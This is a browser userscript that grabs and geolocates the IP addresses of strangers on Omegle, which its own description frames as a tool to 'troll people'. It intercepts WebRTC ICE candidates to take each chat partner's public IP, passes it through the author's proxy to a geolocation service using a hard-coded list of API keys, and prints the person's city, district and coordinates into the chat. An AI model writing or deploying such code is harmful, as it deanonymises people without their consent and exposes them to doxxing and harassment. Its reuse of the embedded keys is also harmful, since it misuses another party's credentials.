// ==UserScript==
// @name         Omegle Geo IP Grabber
// @namespace    https://flawcra.cc
// @version      1.0.3-GitHub
// @description  A simple script to troll people on Omegle.
// @author       FlawCra
// @match        https://www.omegle.com/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var apiKeyList = [
        "cb02841cf46b4a5aabc44939be33daf1",
        "b92a6494329f425e8524371e40ab555c",
        "7de4ad20a3cb47db929eaa5a48bd2d80",
        "55075ac940174541a802c68890855a6e",
        "924909dc6a8a4fdca197ab672f0c85c5",
        "8761d13cbc1147b8b506cbbd806c69de",
        "a88697a768ae436c82eca847927e8887",
        "34c81b745fe04dd8845e726cd914977c"
    ];

    window.oRTCPeerConnection =
        window.oRTCPeerConnection || window.RTCPeerConnection;

    window.RTCPeerConnection = function (...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function (iceCandidate, ...rest) {
            const fields = iceCandidate.candidate.split(" ");

            console.log(iceCandidate.candidate);
            const ip = fields[4];
            if (fields[7] === "srflx") {
                getLocation(ip);
            }
            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };
        return pc;
    };

    var getLocation = async (ip) => {
        let url = "https://cors.flawcra.cc/"+btoa(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKeyList[Math.floor(Math.random() * apiKeyList.length)]}&ip=${ip}`);

        await fetch(url).then((response) =>
                              response.json().then((json) => {
            const output = `
---------------------
IP: ${ip}
Country: ${json.country_name}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
---------------------
`;
            addMessage(output);
        })
                             );
    };

    var addMessage = async (msg) => {
        var logbox = document.getElementsByClassName("logbox")[0].firstChild;
        var div = document.createElement("div");
        div.setAttribute("class","logitem")
        var p = document.createElement("p");
        p.setAttribute("class","statuslog");
        p.innerText = msg;
        div.appendChild(p);
        logbox.appendChild(div);
    };
})();
